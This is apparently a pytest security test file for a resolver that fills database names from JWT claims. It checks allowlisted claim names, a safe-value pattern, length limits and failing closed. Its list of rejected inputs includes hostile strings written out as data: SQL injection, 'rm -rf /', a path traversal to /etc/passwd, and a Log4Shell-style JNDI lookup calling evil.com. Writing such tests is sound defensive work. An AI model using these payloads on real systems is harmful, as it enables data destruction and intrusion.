"""Security tests for the claim-templated datastore resolver.

Coverage
--------
1.  Valid claim values (alphanumeric + underscore + hyphen) resolve correctly.
2.  Non-allowlisted claim name → TemplateSecurityError.
3.  Battery of MALICIOUS claim VALUES — all must be rejected by _SAFE_VALUE_RE:
      - single quote, double quote, semicolons, slashes (SQL/path injection)
      - backslash, null byte, newline, carriage return (OS/shell injection)
      - unicode look-alikes / homoglyphs
      - overlength (>128 chars)
      - empty string
4.  Battery of MALICIOUS claim NAMES (not in CLAIM_ALLOWLIST) — all rejected.
5.  Template with no placeholders resolves to the literal string unchanged.
6.  Missing claim (claim referenced but not present in token) → TemplateSecurityError.
7.  resolve_config applies security to all fields; first failing field stops resolution.
8.  org A claim cannot resolve to org B's value (structural isolation: the resolver
    cannot produce a value not derived from the caller's own verified claims).
9.  TemplateResolver with a custom allowlist accepts only its declared names.
10. get_template_resolver() singleton is stateless / reusable.
"""

from __future__ import annotations

import os

import pytest

# ---------------------------------------------------------------------------
# Env bootstrap
# ---------------------------------------------------------------------------
os.environ.setdefault("DATABASE_URL", "postgresql://fake:fake@localhost/fake")
os.environ.setdefault("JWT_SECRET", "test-jwt-secret-that-is-at-least-32-bytes-long-abcdef")
os.environ.setdefault("ENV", "test")

from app.connectors.claim_template import (  # noqa: E402
    CLAIM_ALLOWLIST,
    TemplateResolver,
    TemplateSecurityError,
    get_template_resolver,
)


# ===========================================================================
# 1. Valid values resolve correctly
# ===========================================================================


def test_valid_claim_resolves():
    """Alphanumeric + underscore + hyphen values resolve without error."""
    resolver = TemplateResolver()
    result = resolver.resolve_template(
        "db_{{ claims.org }}_data",
        {"org": "acme-corp"},
    )
    assert result == "db_acme-corp_data"


def test_valid_underscore_and_digits():
    resolver = TemplateResolver()
    result = resolver.resolve_template(
        "{{ claims.tenant }}_v2",
        {"tenant": "tenant_123"},
    )
    assert result == "tenant_123_v2"


# ===========================================================================
# 2. Non-allowlisted claim NAME → TemplateSecurityError
# ===========================================================================


@pytest.mark.parametrize("bad_name", [
    "admin",
    "password",
    "user_id",
    "database",
    "host",
    "secret",
    "api_key",
    "__proto__",
    "constructor",
    "role",
    "iss",
    "aud",
    "exp",
    "jti",
    "nbf",
])
def test_non_allowlisted_claim_name_rejected(bad_name: str):
    """A placeholder referencing a non-allowlisted claim name must raise TemplateSecurityError."""
    resolver = TemplateResolver()
    with pytest.raises(TemplateSecurityError, match="not in the claim allowlist"):
        resolver.resolve_template(
            f"db_{{{{ claims.{bad_name} }}}}",
            {bad_name: "somevalue"},
        )


# ===========================================================================
# 3. Malicious claim VALUES — SQL/shell/injection chars rejected
# ===========================================================================


@pytest.mark.parametrize("bad_value", [
    "' OR 1=1 --",                   # SQL injection
    "'; DROP TABLE orgs; --",         # SQL injection
    '"double-quoted"',                 # double quote
    "value; rm -rf /",               # shell injection
    "value/path/traversal",          # path separator
    "value\\backslash",              # backslash
    "value\x00null",                 # null byte
    "value\nnewline",                # newline
    "value\rcarriage",               # carriage return
    "value\ttab",                    # tab
    "vаlue",                         # Cyrillic а (homoglyph for ASCII a)
    "val‮ue",                   # RTL override
    "v a l u e",                     # spaces
    "",                              # empty string
    "a" * 129,                       # 129 chars (>128 limit)
    "a" * 256,                       # way over limit
    "value!@#$%^&*()",              # misc special chars
    "value<script>",                 # XSS-style
    "<injection>",                   # angle brackets
    "val\x1b[31mue",                 # ANSI escape
    "../../etc/passwd",              # path traversal
    "${jndi:ldap://evil.com/a}",    # Log4Shell-style
    "{{7*7}}",                       # template injection
])
def test_malicious_value_rejected(bad_value: str):
    """Every malicious value must raise TemplateSecurityError (safe-value check)."""
    resolver = TemplateResolver()
    # Use an allowlisted name; the value is what we're testing
    with pytest.raises(TemplateSecurityError):
        resolver.resolve_template(
            "{{ claims.org }}",
            {"org": bad_value},
        )


# ===========================================================================
# 4. Allowlisted names in CLAIM_ALLOWLIST are accepted
# ===========================================================================


@pytest.mark.parametrize("name", sorted(CLAIM_ALLOWLIST))
def test_allowlisted_claim_name_accepted(name: str):
    """Every name in CLAIM_ALLOWLIST can appear as a placeholder name."""
    resolver = TemplateResolver()
    result = resolver.resolve_template(
        f"prefix_{{{{ claims.{name} }}}}_suffix",
        {name: "safe-value"},
    )
    assert result == "prefix_safe-value_suffix"


# ===========================================================================
# 5. Template with no placeholders → literal unchanged
# ===========================================================================


def test_template_no_placeholders_unchanged():
    """A literal template (no {{ }}) is returned unchanged."""
    resolver = TemplateResolver()
    result = resolver.resolve_template(
        "fixed_database_name",
        {"org": "acme"},
    )
    assert result == "fixed_database_name"


# ===========================================================================
# 6. Missing claim → TemplateSecurityError
# ===========================================================================


def test_missing_claim_raises():
    """A template that references a claim not in the supplied dict must raise."""
    resolver = TemplateResolver()
    with pytest.raises(TemplateSecurityError, match="not present in the verified token"):
        resolver.resolve_template(
            "db_{{ claims.org }}",
            {},  # org not provided
        )


def test_missing_claim_none_value_raises():
    """A claim value of None must raise TemplateSecurityError."""
    resolver = TemplateResolver()
    with pytest.raises(TemplateSecurityError):
        resolver.resolve_template(
            "db_{{ claims.org }}",
            {"org": None},  # type: ignore[dict-item]
        )


# ===========================================================================
# 7. resolve_config: first failing field stops resolution
# ===========================================================================


def test_resolve_config_fails_on_bad_value():
    """resolve_config propagates TemplateSecurityError from the first bad field."""
    resolver = TemplateResolver()
    with pytest.raises(TemplateSecurityError):
        resolver.resolve_config(
            {
                "database": "db_{{ claims.org }}",
                "schema": "{{ claims.tenant }}",
            },
            {"org": "good-value", "tenant": "bad;value"},  # bad schema value
        )


def test_resolve_config_happy_path():
    """resolve_config resolves all fields when all values are safe."""
    resolver = TemplateResolver()
    result = resolver.resolve_config(
        {"database": "ks_{{ claims.org }}", "schema": "{{ claims.tenant }}_data"},
        {"org": "acme", "tenant": "prod"},
    )
    assert result == {"database": "ks_acme", "schema": "prod_data"}


# ===========================================================================
# 8. Org A claim cannot produce org B's value (structural isolation)
# ===========================================================================


def test_claim_value_must_come_from_caller_claims():
    """The resolver can only produce values derived from the supplied claims dict.

    An attacker cannot inject a different org's value via the template —
    the output is purely a function of the template + the caller's claims.
    Org isolation is guaranteed because the claims come from the verified
    JWT (not from the request body).
    """
    resolver = TemplateResolver()

    org_a_claims = {"org": "org-alpha"}
    org_b_claims = {"org": "org-beta"}

    template = "db_{{ claims.org }}"
    result_a = resolver.resolve_template(template, org_a_claims)
    result_b = resolver.resolve_template(template, org_b_claims)

    assert result_a == "db_org-alpha"
    assert result_b == "db_org-beta"
    assert result_a != result_b, "Different orgs must resolve to different databases"


# ===========================================================================
# 9. Custom allowlist restricts to declared names only
# ===========================================================================


def test_custom_allowlist_only_accepts_declared_names():
    """A TemplateResolver with a custom allowlist refuses standard CLAIM_ALLOWLIST names."""
    custom_resolver = TemplateResolver(allowlist=frozenset({"my_custom_claim"}))
    # Custom name is allowed
    result = custom_resolver.resolve_template(
        "{{ claims.my_custom_claim }}",
        {"my_custom_claim": "safe123"},
    )
    assert result == "safe123"

    # Standard name 'org' is NOT in this custom allowlist
    with pytest.raises(TemplateSecurityError, match="not in the claim allowlist"):
        custom_resolver.resolve_template(
            "{{ claims.org }}",
            {"org": "acme"},
        )


# ===========================================================================
# 10. get_template_resolver() singleton is reusable (stateless)
# ===========================================================================


def test_singleton_is_stateless_and_reusable():
    """The process-level singleton can be called multiple times safely."""
    r1 = get_template_resolver()
    r2 = get_template_resolver()
    assert r1 is r2, "get_template_resolver must return the same singleton"

    # Both calls produce consistent results
    r1_result = r1.resolve_template("{{ claims.org }}", {"org": "acme"})
    r2_result = r2.resolve_template("{{ claims.org }}", {"org": "acme"})
    assert r1_result == r2_result == "acme"


# ===========================================================================
# 11. Edge: valid boundary values (exactly 128 chars, single char)
# ===========================================================================


def test_value_exactly_128_chars_accepted():
    """A value of exactly 128 alphanumeric chars is at the boundary — accepted."""
    resolver = TemplateResolver()
    v = "a" * 128
    result = resolver.resolve_template("{{ claims.org }}", {"org": v})
    assert result == v


def test_value_single_char_accepted():
    """A single alphanumeric char is a valid resolved value."""
    resolver = TemplateResolver()
    result = resolver.resolve_template("{{ claims.org }}", {"org": "x"})
    assert result == "x"


# ===========================================================================
# 12. Resolver failure fails closed — no fallback credential
# ===========================================================================


def test_resolver_failure_raises_not_silenced():
    """A TemplateSecurityError from the resolver must propagate — never silenced.

    The connector layer must re-raise the error (fail closed) rather than
    falling back to a default credential or empty string.
    """
    resolver = TemplateResolver()
    # Confirm the error propagates from resolve_template
    with pytest.raises(TemplateSecurityError):
        resolver.resolve_template(
            "{{ claims.org }}",
            {"org": "'; DROP TABLE connectors; --"},
        )
    # No fallback value was produced — the exception IS the safe outcome
